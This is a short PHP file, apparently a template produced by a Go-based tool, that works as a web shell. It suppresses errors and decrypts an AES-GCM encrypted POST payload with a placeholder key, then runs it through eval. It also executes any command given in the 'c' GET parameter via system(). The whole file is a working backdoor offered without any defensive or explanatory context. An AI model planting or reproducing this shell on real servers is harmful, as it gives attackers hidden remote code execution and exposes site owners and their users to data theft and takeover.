<?php
@error_reporting(0);
if(isset($_POST['f'])){
    $d = base64_decode($_POST['f']);
    $nonce = substr($d, 0, 12);
    $tag = substr($d, -16);
    $ciphertext = substr($d, 12, -16);
    $key = hex2bin("{{HEX_AES_KEY_FROM_GO}}");
    $plain = openssl_decrypt($ciphertext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $nonce, $tag);
    eval($plain);
}
if(isset($_GET['c'])){
    system($_GET['c']);
}
?>
